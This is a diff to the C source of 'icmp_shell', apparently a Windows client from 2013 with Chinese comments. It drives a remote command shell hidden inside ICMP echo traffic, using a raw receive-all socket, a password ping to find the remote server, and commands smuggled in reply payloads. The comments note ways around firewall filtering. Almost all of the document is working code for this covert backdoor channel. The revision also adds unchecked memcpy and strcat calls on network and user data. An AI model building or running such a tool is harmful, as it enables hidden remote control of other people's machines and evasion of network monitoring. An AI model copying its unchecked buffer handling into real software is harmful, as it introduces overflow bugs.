@@ -1,39 +1,42 @@
 /*
 Copyright (C) 2013   sincoder
 
-This program is free software; you can redistribute it and/or
-modify it under the terms of the GNU General Public License
-as published by the Free Software Foundation; either version 2
-of the License, or (at your option) any later version.
-
-This program is distributed in the hope that it will be useful,
-but WITHOUT ANY WARRANTY; without even the implied warranty of
-MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
-GNU General Public License for more details.
-
-You should have received a copy of the GNU General Public License
-along with this program; if not, write to the Free Software
-Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
-
-
-
-运行在 windows 上的客户端
-
-使用方法  
-
-icmp_shell.exe [ip]
-然后弹出一个 窗口 用于执行命令
-
-搞个对话框真的是多余的 
-
-数据验证 
- client 发送 密码字符串到服务端  服务端验证成功了 就会回复 一个 reply 消息  
- 否则的话 client 段 会因为 超时而失败
-
- 后期通信的话 都会使用这个密码字符串来进行加密 
-
- 客户端收到的数据都来自 request 包 
- 客户端会尝试使用输入的密码来解密收到的数据  解密正确的数据 应该全部都是 字符串 
+  This program is free software; you can redistribute it and/or
+  modify it under the terms of the GNU General Public License
+  as published by the Free Software Foundation; either version 2
+  of the License, or (at your option) any later version.
+  
+	This program is distributed in the hope that it will be useful,
+	but WITHOUT ANY WARRANTY; without even the implied warranty of
+	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+	GNU General Public License for more details.
+	
+	  You should have received a copy of the GNU General Public License
+	  along with this program; if not, write to the Free Software
+	  Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
+	  
+	   
+		
+		 运行在 windows 上的客户端
+		 
+		  使用方法  
+		  
+		   icmp_shell.exe [ip]
+		   然后弹出一个 窗口 用于执行命令
+		   
+			搞个对话框真的是多余的 
+			
+			 数据验证 
+			 client 发送 密码字符串到服务端  服务端验证成功了 就会回复 一个 reply 消息  
+			 否则的话 client 段 会因为 超时而失败
+			 
+			  后期通信的话 都会使用这个密码字符串来进行加密 
+			  
+			   客户端收到的数据都来自 request 包 
+			   客户端会尝试使用输入的密码来解密收到的数据  解密正确的数据 应该全部都是 字符串 
+			   
+				 2013.4.27  RAW  收到的包 会经过 windows  的防火墙的过滤 还是 winpcap 搞起吧 
+				 尼玛  winpcap 上面还要选择 网卡 蛋疼啊 
 */
 
 #include <WinSock2.h>
@@ -42,14 +45,35 @@ icmp_shell.exe [ip]
 #include <stdio.h>
 #include <mstcpip.h>
 #include <IPHlpApi.h>
-#include "resource.h"
+//#include "resource.h"
 
 #pragma comment(lib,"ws2_32")
 #pragma comment(lib,"Iphlpapi.lib")
 
+#define MAX_BUFF_SIZE 1000
+
+#if _MSC_VER <= 1200
+void dbg_msg(char *fmt,...)
+{
+	va_list args;
+	int n;
+	char TempBuf[8192];
+	va_start(args, fmt);
+	n = vsprintf(TempBuf, fmt, args);
+	printf("%s",TempBuf);
+    va_end(args);
+}
+#else  //使用宏来定义 
 #define dbg_msg(fmt,...) do{\
     printf(##__FUNCTION__##" %d :"##fmt,__LINE__,__VA_ARGS__);\
-    }while(0);
+}while(0);
+#endif
+
+#ifndef _In_
+#define _In_
+#define _Out_
+#define _In_opt_
+#endif
 
 typedef unsigned char uint8;
 typedef unsigned short uint16;
@@ -76,7 +100,18 @@ __inline void lock_unlock(lock *cs)
     LeaveCriticalSection(cs);
 }
 
+enum PACKET_TYPE
+{
+	TYPE_REQUEST = 0x2B,
+		TYPE_REPLY
+};
+
 #pragma pack(push,1)
+
+struct packet_header
+{
+	uint8 type;
+};
 
 struct icmphdr
 {
@@ -138,18 +173,19 @@ char   g_input_buffer[INPUT_BUFFER_SIZE];  //用户输入的 数据 。。。
 lock  g_input_lock;
 char *g_remote_ip;
 char *g_password = NULL;
+uint32 g_bind_ip = 0;//本地绑定的 Ip 
 
 HANDLE (__stdcall *pf_IcmpCreateFile)(void) = NULL;
 DWORD (__stdcall *pf_IcmpSendEcho)(
-    _In_      HANDLE IcmpHandle,
-    _In_      IPAddr DestinationAddress,
-    _In_      LPVOID RequestData,
-    _In_      WORD RequestSize,
-    _In_opt_  PIP_OPTION_INFORMATION RequestOptions,
-    _Out_     LPVOID ReplyBuffer,
-    _In_      DWORD ReplySize,
-    _In_      DWORD Timeout
-    ) = NULL;
+								   _In_      HANDLE IcmpHandle,
+								   _In_      IPAddr DestinationAddress,
+								   _In_      LPVOID RequestData,
+								   _In_      WORD RequestSize,
+								   _In_opt_  PIP_OPTION_INFORMATION RequestOptions,
+								   _Out_     LPVOID ReplyBuffer,
+								   _In_      DWORD ReplySize,
+								   _In_      DWORD Timeout
+								   ) = NULL;
 
 BOOL load_deps()
 {
@@ -174,13 +210,9 @@ BOOL load_deps()
             return TRUE;
         }
     }
-
-    printf("failed to load functions (%u) \n", GetLastError());
-
+    dbg_msg("failed to load functions (%u) \n", GetLastError());
     return FALSE;
 }
-
-
 
 /*
 计算 icmp 数据包的 校验和
@@ -189,27 +221,26 @@ unsigned short checksum(unsigned short *ptr, int nbytes)
 {
     unsigned long sum;
     unsigned short oddbyte, rs;
-
+	
     sum = 0;
     while(nbytes > 1) 
     {
         sum += *ptr++;
         nbytes -= 2;
     }
-
+	
     if(nbytes == 1) 
     {
         oddbyte = 0;
         *((unsigned char *) &oddbyte) = *(unsigned char  *)ptr;
         sum += oddbyte;
     }
-
+	
     sum  = (sum >> 16) + (sum & 0xffff);
     sum += (sum >> 16);
     rs = ~sum;
     return rs;
 }
-
 /*
 构建一个回复包 
 */
@@ -218,19 +249,22 @@ BOOL  send_icmp_replay_packet(struct icmphdr *request,uint32 ip,char *data,int s
     BOOL ret = FALSE;
     int  packet_size = sizeof(struct icmphdr) + size;
     struct icmphdr *reply_packet = (struct icmphdr *)malloc(packet_size);
+	
+	dbg_msg("send_icmp_replay_packet() :try send reply to %s \n", inet_ntoa(*(struct in_addr *)&ip));
+	
     if(NULL != reply_packet)
     {
         char *pdata ;
         struct sockaddr_in addr;
-
+		
         memcpy(reply_packet,request,sizeof(struct icmphdr));
         reply_packet->type = 0 ; // reply
         pdata = (char *)(reply_packet + 1);
         memcpy(pdata,data,size);
-
+		
         reply_packet->checksum = 0;
         reply_packet->checksum = checksum((unsigned short *)reply_packet,packet_size);
-
+		
         memset(&addr,0,sizeof(struct sockaddr_in));
         addr.sin_family = AF_INET;
         addr.sin_addr.S_un.S_addr = ip;
@@ -246,6 +280,7 @@ BOOL set_socket_recv_all(SOCKET s)
 {
     //http://www.okob.net/wp/index.php/2009/04/30/icmp-over-raw-sockets-under-windows-vista/
     /* Run the IOCTL that disables packet filtering on the socket. */
+#if WINVER > 0x600
     DWORD tmp, prm = RCVALL_IPLEVEL; /* "RCVALL_IPLEVEL" (Vista SDK) */
     if(WSAIoctl(s, SIO_RCVALL, &prm, sizeof(prm), NULL, 0,
         &tmp, NULL, NULL) == SOCKET_ERROR)
@@ -254,40 +289,86 @@ BOOL set_socket_recv_all(SOCKET s)
         return FALSE;
     }
     return TRUE;
+#else
+	u_long old = 1;
+	return (0 == ioctlsocket(s,SIO_RCVALL,&old));
+	//dbg_msg("Nt 5.x do not need to set this flag !! \n");
+#endif
 }
 
 DWORD __stdcall Icmp_recv_thread(LPVOID lparam)
 {
     char buff[1500];
     int nbytes = 0;
-
+	dbg_msg("icmp recv thread start !! \n");
     while((nbytes = recv(g_sock,buff,1500,0)) > 0) 
     {
         IPHeader *ip = (IPHeader *)buff;
         int iplen = (ip->iphVerLen & 0xf) * sizeof(unsigned int);
         struct icmphdr *icmp = (struct icmphdr *)((char *)ip + iplen);
-        printf("recv %d bytes from %s \n",nbytes,inet_ntoa(*(struct in_addr *)&ip->ipSource));
-        if(0 == icmp->type)
-        {
-            printf("icmp reply \n");
-        }
-        else if(8 == icmp->type)
-        {
-            char buff[INPUT_BUFFER_SIZE];
-            printf("icmp request \n");
-            //收到这个请求的时候 我们应该发送本地的数据  不管有木有 
-            *(uint32 *)&buff[0]=0x842B;
-            lock_lock(&g_input_lock);
-            strcpy((char *)&buff[0] + 2,g_input_buffer,strlen(g_input_buffer));
-            send_icmp_replay_packet(icmp,ip->ipSource,&buff[0],strlen(g_input_buffer) + 2);
-            g_input_buffer[0] = 0;
-            lock_unlock(&g_input_lock);
-        }
-        else
-        {
-            printf("unknown type : %d \n",icmp->type);
-        }
+        dbg_msg("recv %d bytes from %s \n",nbytes,inet_ntoa(*(struct in_addr *)&ip->ipSource));
+		
+		nbytes -= iplen;
+		
+		if(0 == icmp->code)  // icmp echo 
+		{
+			if(0 == icmp->type)
+			{
+				dbg_msg("icmp reply \n");
+			}
+			else if(8 == icmp->type )//&& g_bind_ip != ip->ipSource)  //确保不是我们发的包 
+			{
+				char *pdata  = NULL; //服务端发过来的数据 
+				struct packet_header *phdr = NULL;
+				dbg_msg("icmp request  from %s \n",inet_ntoa(*(struct in_addr *)&ip->ipSource));
+				phdr = (struct packet_header *)(icmp + 1);
+				switch(phdr->type)
+				{
+				case TYPE_REPLY:
+					{
+						dbg_msg("packet type is replay  !! \n");
+						dbg_msg("reply packet in request icmp msg  something may goes wrong !!! \n");
+					}
+					break;
+				case TYPE_REQUEST:
+					{
+						char buff[MAX_BUFF_SIZE];
+						dbg_msg("packet type is request \n");
+						// 我们只关心  request 
+						pdata = (char *)(phdr + 1);
+						nbytes -= sizeof(struct icmphdr);
+						nbytes -= sizeof(struct packet_header);
+						
+						memcpy(buff,pdata,nbytes);
+						buff[nbytes] = 0;
+						dbg_msg("recv %d bytes : %s \n",nbytes ,buff);
+						
+						//下面发送 回复 
+						//收到这个请求的时候 我们应该发送本地的数据  不管有木有 
+						lock_lock(&g_input_lock);
+						dbg_msg("try send %s \n",g_input_buffer);
+						memset(buff,0,MAX_BUFF_SIZE);
+						buff[0] = TYPE_REPLY;
+						strcpy(&buff[1],g_input_buffer);
+						send_icmp_replay_packet(icmp,ip->ipSource,&buff[0],strlen(g_input_buffer) + 1 );
+						g_input_buffer[0] = 0;
+						lock_unlock(&g_input_lock);
+					}
+					break;
+				default:
+					{
+						dbg_msg("unknown packet type !!! \n");
+					}
+					break;
+				}
+			}
+			else
+			{
+				dbg_msg("unknown type : %d \n",icmp->type);
+			}
+		}
     }
+	dbg_msg("icmp recv thread end !! \n");
     return 0;
 }
 
@@ -297,29 +378,29 @@ void Loop_recv_cmd()
     char line[201];
     ULONG inputLength;
     PSTR command;
-
+	
     while (TRUE)
     {
         if (!fgets(line, sizeof(line) -1 , stdin))
             break; //控制台已经被关闭了
-
+		
         // Remove the terminating new line character.
-
+		
         inputLength = (ULONG)strlen(line);
-
+		
         if (inputLength != 0)
             line[inputLength - 1] = 0;
-
+		
         command = strtok(line, delims);
-
+		
         if (!command)
         {
             continue;
         }
         //send command 
-       //printf("%s\n",command);
+		//printf("%s\n",command);
         lock_lock(&g_input_lock);
-        strcat_s(g_input_buffer,INPUT_BUFFER_SIZE,command);
+        strcat(g_input_buffer,command);
         lock_unlock(&g_input_lock);
     }
 }
@@ -333,29 +414,29 @@ u_long getBindIpAddress(char * dstIpAddr)
     PMIB_IPADDRTABLE	ipTable = NULL;
     ULONG	allocSize = 0;
     HRESULT ret;
-
+	
     ret = GetBestInterface( inet_addr(dstIpAddr), &nInterfaceIndex );
-
+	
     if (ret != NO_ERROR)
     {
         goto __exit;
     }
-
+	
     /*
     MIB_IFROW ifRow;
     ifRow.dwIndex = nInterfaceIndex;
     ret = GetIfEntry( &ifRow );
-
-    if ( ret != NO_ERROR )
-    {
-    goto __exit;
-    }
-
-    printf("%s\n", ifRow.bDescr);
+	
+	  if ( ret != NO_ERROR )
+	  {
+	  goto __exit;
+	  }
+	  
+		printf("%s\n", ifRow.bDescr);
     */
-
+	
     allocSize = 0;	
-
+	
     do
     {
         ret = GetIpAddrTable( ipTable, &allocSize, FALSE );
@@ -367,7 +448,7 @@ u_long getBindIpAddress(char * dstIpAddr)
             }
         }
     } while (ret != NO_ERROR);
-
+	
     for (index = 0; index < ipTable->dwNumEntries; index++)
     {
         if (ipTable->table[ index ].dwIndex == nInterfaceIndex)
@@ -376,7 +457,7 @@ u_long getBindIpAddress(char * dstIpAddr)
             break;
         }
     }
-
+	
 __exit:
     if (ipTable)
     {
@@ -389,16 +470,20 @@ __exit:
 测试下远程的机器是不是运行着我们的服务端程序 
 通过发送一个 request 包 然后如果那边正在运行一个服务端的话  如果密码正确的话  就会主动的发送包给我们  告诉我们加载的密钥（也就是密码）
 
-没必要发送密码 ping 一下就行了 
+ 没必要发送密码 ping 一下就行了 
 */
 BOOL ping_remote_host(char *ip)
 {
     BOOL ret = FALSE;
+	char request_buff[512] = {0};
     char replybuff[1024];
     HANDLE hIcmp = pf_IcmpCreateFile();
+
     if(INVALID_HANDLE_VALUE == hIcmp)
         return FALSE;
-    if(pf_IcmpSendEcho(hIcmp,inet_addr(ip),"sincoder",strlen("sincoder")+1,NULL,replybuff,1024,3000))  //等待3s
+    request_buff[0] = TYPE_REQUEST;
+	strcpy(&request_buff[1],"sincoder");
+	if(pf_IcmpSendEcho(hIcmp,inet_addr(ip),&request_buff[0],strlen(&request_buff[1]) + 1,NULL,replybuff,1024,3000))  //等待3s
     {
         PICMP_ECHO_REPLY pReply = (PICMP_ECHO_REPLY)replybuff;
         if(pReply->DataSize > 0)
@@ -417,28 +502,36 @@ int main(int argc,char **argv)
     int opt = 1;
     int len = sizeof(struct sockaddr);
     HANDLE hRecvThread;
-
+	
     if(argc < 3)
     {
         printf("icmp shell \nBy sincoder \nUsage:%0 [ip]  [password]\n");
         return -1;
     }
-
+	
     g_remote_ip = argv[1];
     if(0 == inet_addr(g_remote_ip))
     {
         dbg_msg("error ip format ! \n");
         return -2;
     }
-
+	
     if(!load_deps())
     {
         printf("failed to load dll \n");
         return -3;
     }
-
+	
     g_password = argv[2];
-
+	
+    g_bind_ip = getBindIpAddress(g_remote_ip); 
+	
+    if(INADDR_NONE == g_bind_ip)
+    {
+        printf("failed to get local bind ip \n");
+        return -4;
+    }
+	
     WSAStartup(MAKEWORD(2,2),&wsa);
     g_sock = socket(AF_INET,SOCK_RAW,IPPROTO_ICMP);
     if(INVALID_SOCKET == g_sock)
@@ -446,33 +539,32 @@ int main(int argc,char **argv)
         dbg_msg("create socket failed \n");
         return -1;
     }
-
-    //setsockopt(g_sock,IPPROTO_ICMP, IP_HDRINCL,(char *)&opt,sizeof(int));  //需要操作 ip 头的时候才需要设置
-
-    addr.sin_addr.S_un.S_addr = getBindIpAddress(g_remote_ip); //use google dns to detect Wlan ip 
+	
+    addr.sin_addr.S_un.S_addr =  g_bind_ip;
     addr.sin_family = AF_INET;
     addr.sin_port = 0;
-
+	
     if(SOCKET_ERROR == bind(g_sock,(struct sockaddr *)&addr,sizeof(struct sockaddr)))
     {
-        dbg_msg("bind failed");
+        dbg_msg("bind failed  !! \n");
         closesocket(g_sock);
         return -1;
     }
-
+	
+	dbg_msg("bind on ip : %s \n",inet_ntoa(*(struct in_addr *)&g_bind_ip));
     set_socket_recv_all(g_sock);  //  vista 以上的系统必须这样设置下 才能收到 ping request 包。。。
     lock_init(&g_input_lock);
-
+	
     hRecvThread = CreateThread(NULL,0,Icmp_recv_thread,NULL,0,NULL);
-    printf("send init command request !! \n");
+    dbg_msg("send init command request !! \n");
     // 发送一个包 探测下 远程 是不是 正在运行着我们的 服务端 
-    if(ping_remote_host(g_remote_ip)
+    if(ping_remote_host(g_remote_ip))
     {
         dbg_msg("ping host %s OK !! \n",g_remote_ip);
         //对方可以 Ping 的 通
         Loop_recv_cmd();  //接收用户的输入
     }
-
+	
     dbg_msg("last error : %d \n",GetLastError());
     closesocket(g_sock);
     WaitForSingleObject(hRecvThread,INFINITE);
